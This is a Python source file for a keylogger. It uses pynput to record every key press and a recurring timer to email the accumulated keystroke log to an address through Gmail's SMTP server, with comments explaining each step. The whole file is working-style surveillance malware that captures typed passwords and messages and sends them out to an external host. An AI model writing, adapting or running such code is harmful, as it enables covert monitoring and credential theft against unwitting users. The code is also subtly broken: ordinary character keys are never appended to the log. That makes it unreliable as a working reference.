#!/usr/bin/env python
import smtplib
#Importing the smtplib module to allow sending email using SMTP.
import pynput.keyboard
#Importing the pynput.keyboard module to listen for keyboard inputs.
import threading
#Importing the threading module to allow for scheduling functions to run at specified intervals.


#The constructor for the Keylogger class, which initializes the log message, time interval, email, and password.
class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

#A function that appends the specified string to the log.
    def append_to_log(self, string):
        self.log = self.log + string

#A function that processes each key press, converting it to a string and appending it to the log.
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
            self.append_to_log(current_key)

 #A function that sends the log via email and clears the log. This function is scheduled to run at the specified time interval using the Timer function.
    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        print(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

#A function that sends an email using the specified email and password.
    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

#A function that starts the keylogger by creating a keyboard listener and scheduling the report function to run at the specified time interval.
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
